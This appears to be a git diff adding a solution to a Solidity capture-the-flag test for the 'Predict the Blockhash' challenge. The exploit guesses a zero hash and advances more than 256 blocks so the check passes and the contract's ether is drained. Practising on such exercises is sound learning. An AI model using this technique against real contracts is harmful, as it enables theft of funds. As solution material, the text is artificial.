@@ -9,7 +9,7 @@ import "../src/PredictTheBlockhash.sol";
 contract PredictTheBlockhashTest is Test {
     PredictTheBlockhash public predictTheBlockhash;
     ExploitContract public exploitContract;
-
+    
     function setUp() public {
         // Deploy contracts
         predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
@@ -19,12 +19,13 @@ contract PredictTheBlockhashTest is Test {
     function testExploit() public {
         // Set block number
         uint256 blockNumber = block.number;
-        // To roll forward, add the number of blocks to -256,
-        // Eg. roll forward 10 blocks: -256 + 10 = -246
-        vm.roll(blockNumber - 256);
-
         // Put your solution here
-
+        // blockhash will return 0 for current block
+        bytes32 guess = blockhash(blockNumber);
+        predictTheBlockhash.lockInGuess{value: 1 ether}(guess);
+        // blockhash does not work for blocks that are older than 256, it then returns a zero address
+        vm.roll(blockNumber + 300);
+        predictTheBlockhash.settle();
         _checkSolved();
     }
 
